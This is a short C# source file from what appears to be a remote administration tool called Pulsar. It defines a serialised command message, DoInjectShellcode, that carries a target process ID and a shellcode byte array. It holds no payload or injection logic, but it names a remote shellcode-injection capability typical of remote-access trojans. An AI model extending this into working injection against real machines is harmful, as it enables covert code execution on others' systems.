using MessagePack;
using Pulsar.Common.Messages.Other;

namespace Pulsar.Common.Messages.Administration.TaskManager
{
    [MessagePackObject]
    public class DoInjectShellcode : IMessage
    {
        [Key(1)]
        public int ProcessId { get; set; }

        [Key(2)]
        public byte[] Shellcode { get; set; }
    }
}